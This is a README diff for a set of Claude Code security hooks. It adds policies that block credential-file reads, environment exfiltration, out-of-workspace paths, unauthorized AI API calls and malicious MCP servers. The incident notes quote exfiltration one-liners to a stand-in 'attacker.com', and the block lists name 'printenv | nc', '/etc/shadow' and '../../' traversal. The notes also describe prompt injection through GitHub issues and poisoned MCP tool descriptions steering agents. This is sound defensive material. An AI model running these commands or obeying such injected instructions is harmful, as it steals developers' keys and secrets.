@@ -1,6 +1,6 @@
 # claude-hooks
 
-> Org-wide security guardrails for Claude Code — 8 policies backed by real incidents, deployed in one command.
+> Org-wide security guardrails for Claude Code — 13 policies backed by real incidents, deployed in one command.
 
 AI coding agents are powerful. They read your files, execute commands, install packages, and push code. Without guardrails, they are also the fastest path to a production outage, a GDPR violation, or a $47,000 API bill from a runaway loop.
 
@@ -8,7 +8,7 @@ This repo gives every engineer in your org the same baseline of protection — w
 
 ---
 
-## The 8 Policies
+## The 13 Policies
 
 ### 01 · Secrets Guard
 **Blocks writing API keys, tokens, and credentials to files.**
@@ -91,6 +91,69 @@ Blocks: Same Bash command running 5+ times in one session · Audits all LLM API 
 
 ---
 
+### 09 · Credential File Read Protection
+**Blocks reading SSH keys, cloud credential files, crypto wallets, and TLS private keys.**
+
+> NPM/Nx supply chain attack (August 2025): Malicious `telemetry.js` injected into the Nx build system searched for and exfiltrated `~/.ssh/id_rsa`, `~/.aws/credentials`, wallet keystores, and `.env` files via HTTP from the build environment.
+>
+> Anthropic AI-orchestrated espionage disruption (September 2025): Adversaries manipulated Claude Code to harvest credentials from **~30 global targets** by reading `~/.ssh/`, `~/.aws/credentials`, and service account key files, then transmitting them via outbound HTTP.
+>
+> CVE-2025-6514 (mcp-remote, 437K downloads): Proof-of-concept payload: `cat ~/.ssh/id_rsa | curl -d @- attacker.com` — a single tool call, zero user interaction.
+
+Blocks: `~/.ssh/id_rsa` · `~/.aws/credentials` · `~/.kube/config` · `~/.gnupg/` · `.netrc` · wallet keystores · TLS private keys
+
+---
+
+### 10 · Environment Variable Exfiltration Guard
+**Blocks commands that dump environment variables to network destinations.**
+
+> Anthropic AI espionage campaign (September 2025): Attackers directed Claude Code to run `env | curl -d @- attacker.com` style commands. AI agent processes inherit **ALL** environment variables from the developer's shell — including ANTHROPIC_API_KEY, AWS_ACCESS_KEY_ID, DATABASE_URL, and every secret ever exported.
+>
+> GitHub MCP Prompt Injection (May 2025): Malicious GitHub Issues triggered `printenv | base64 | curl` — complete environment exfiltration in a single injected command.
+
+Blocks: `env | curl` · `printenv | nc` · `export -p | base64` · env staged to `/tmp` · `/proc/self/environ` reads
+
+---
+
+### 11 · Workspace Boundary Protection
+**Blocks reads of system files and paths outside the project workspace.**
+
+> 21,000 exposed AI agent instances (2025): Security researchers found 21,000+ AI coding agent instances on the internet with unrestricted filesystem access — many had read `/etc/passwd` and system configuration files that appeared verbatim in generated output.
+>
+> IDEsaster CVEs (December 2025): CVE-2025-49150 (Cursor), CVE-2025-53097 (Roo Code), CVE-2025-58335 (JetBrains Junie) — path traversal via `../../` sequences in tool parameters. 100% of tested AI IDEs were vulnerable.
+>
+> GitHub MCP Data Heist (May 2025): After prompt injection, the agent read `.git/config` to extract embedded auth tokens, then used those credentials to exfiltrate private repos and plant backdoors.
+
+Blocks: `/etc/passwd`, `/etc/shadow`, `/etc/sudoers` · `~/.bash_history` · crontab files · `/proc/self/environ` · `../../` path traversal · `.git/config`
+
+---
+
+### 12 · Shadow AI / LLMjacking Detection
+**Detects and blocks unauthorized AI API calls — free compute theft.**
+
+> LLMjacking trend (2024-2025, Sysdig): Attackers compromise developer machines specifically to steal LLM API keys. A single Claude Opus key can cost **$75/million output tokens**. A stolen key running inference for a week = thousands of dollars in unauthorized charges. LLMjacking attacks increased **+400%** between Q1 2024 and Q1 2025.
+>
+> Postmark-MCP (September 2025): The first malicious MCP server extracted OpenAI API keys from the developer environment and used them for LLMjacking while proxying legitimate requests. **1,643 downloads** before removal.
+>
+> Smithery supply chain (October 2025): 3,000+ hosted MCP apps compromised to extract ANTHROPIC_API_KEY, OPENAI_API_KEY, and TOGETHER_AI_KEY for free AI inference.
+
+Audits: Calls to OpenAI, Together.ai, Cohere, Mistral, Perplexity, Groq, Fireworks from within agent code
+
+---
+
+### 13 · MCP Server Validation
+**Audits MCP server installations. Blocks known-malicious packages (CVE-2025-6514).**
+
+> CVE-2025-6514 — mcp-remote OAuth Proxy RCE (2025): The `mcp-remote` package (**437,000 downloads**) had shell injection via the `authorization_endpoint` parameter. Connecting to a malicious MCP server achieves RCE on the developer's machine with zero user interaction.
+>
+> MCP tool poisoning (2025): Researchers showed that injecting malicious instructions into an MCP tool's description field caused AI agents to perform unintended actions with an **84.2% success rate** — the developer sees a normal tool; the AI sees hidden instructions.
+>
+> Smithery (October 2025): Platform-level compromise exposed **3,000+ MCP app API tokens** including Anthropic, OpenAI, AWS, and GitHub PATs — persisted for **11 days** undetected.
+
+Blocks: `mcp-remote` (CVE-2025-6514) · Audits: all MCP server installs · Smithery-hosted connections
+
+---
+
 ## Architecture
 
 ```
@@ -105,7 +168,12 @@ Blocks: Same Bash command running 5+ times in one session · Audits all LLM API 
 │       ├── 05-git-protection.sh
 │       ├── 06-data-sources.sh
 │       ├── 07-rules-integrity.sh
-│       └── 08-cost-circuit-breaker.sh
+│       ├── 08-cost-circuit-breaker.sh
+│       ├── 09-credential-files.sh
+│       ├── 10-env-exfiltration.sh
+│       ├── 11-workspace-boundary.sh
+│       ├── 12-shadow-ai.sh
+│       └── 13-mcp-validation.sh
 ├── policy-config.json        ← enable/disable/mode per policy
 └── settings.json             ← wires pre-tool.sh to PreToolUse
 ```
@@ -149,7 +217,12 @@ Edit `.claude/policy-config.json`:
     "git-protection":       { "enabled": true, "mode": "block" },
     "data-sources":         { "enabled": true, "mode": "block" },
     "rules-integrity":      { "enabled": true, "mode": "audit" },
-    "cost-circuit-breaker": { "enabled": true, "mode": "block" }
+    "cost-circuit-breaker": { "enabled": true, "mode": "block" },
+    "credential-files":     { "enabled": true, "mode": "block" },
+    "env-exfiltration":     { "enabled": true, "mode": "block" },
+    "workspace-boundary":   { "enabled": true, "mode": "block" },
+    "shadow-ai":            { "enabled": true, "mode": "audit" },
+    "mcp-validation":       { "enabled": true, "mode": "audit" }
   }
 }
 ```
@@ -165,7 +238,8 @@ All violations logged to `~/.claude/audit/policy-violations.jsonl`:
 
 ```json
 {"timestamp":"2026-01-15T09:32:11Z","event":"policy_blocked","policy":"secrets","tool":"Write","matched":"Anthropic API Key","session":"abc123","cwd":"/project"}
-{"timestamp":"2026-01-15T09:45:03Z","event":"policy_blocked","policy":"prod-protection","tool":"Bash","matched":"kubectl destructive op on prod","session":"abc123","cwd":"/project"}
+{"timestamp":"2026-01-15T09:45:03Z","event":"policy_blocked","policy":"credential-files","tool":"Read","matched":"SSH private key","session":"abc123","cwd":"/project"}
+{"timestamp":"2026-01-15T09:51:22Z","event":"policy_blocked","policy":"env-exfiltration","tool":"Bash","matched":"Environment dump via env/printenv","session":"abc123","cwd":"/project"}
 ```
 
 ```bash
@@ -174,6 +248,9 @@ jq -r '.policy' ~/.claude/audit/policy-violations.jsonl | sort | uniq -c | sort 
 
 # All supply chain installs (audit trail)
 jq 'select(.policy == "supply-chain")' ~/.claude/audit/policy-violations.jsonl
+
+# MCP server activity
+jq 'select(.policy == "mcp-validation")' ~/.claude/audit/policy-violations.jsonl
 ```
 
 ---
@@ -192,6 +269,14 @@ jq 'select(.policy == "supply-chain")' ~/.claude/audit/policy-violations.jsonl
 | Production destruction | Pinecone 515 indexes deleted | Irreversible customer data loss |
 | Runaway costs | $47K loop (11 days) | Unbounded API spend |
 | GDPR | Meta €1.2B · LinkedIn €310M | Up to 4% global revenue per violation |
+| SSH key theft | NPM/Nx telemetry.js (Aug 2025) | ~/.ssh/id_rsa exfiltrated from build env |
+| AI espionage | Anthropic disruption (Sep 2025) | ~30 global targets, credentials harvested |
+| MCP RCE | CVE-2025-6514 mcp-remote (437K downloads) | Shell injection, developer machine RCE |
+| MCP supply chain | Postmark-MCP (Sep 2025, 1,643 installs) | All emails copied + API keys stolen |
+| MCP platform | Smithery (Oct 2025, 3,000+ apps) | All API tokens exposed for 11 days |
+| Prompt injection | GitHub MCP Data Heist (May 2025) | Private repos + crypto keys exfiltrated |
+| LLMjacking | Sysdig 2024-2025 (+400% YoY) | AI compute stolen, thousands $/week |
+| 21K exposed instances | Researcher disclosure (2025) | /etc/passwd, system files in agent context |
 
 ---
 
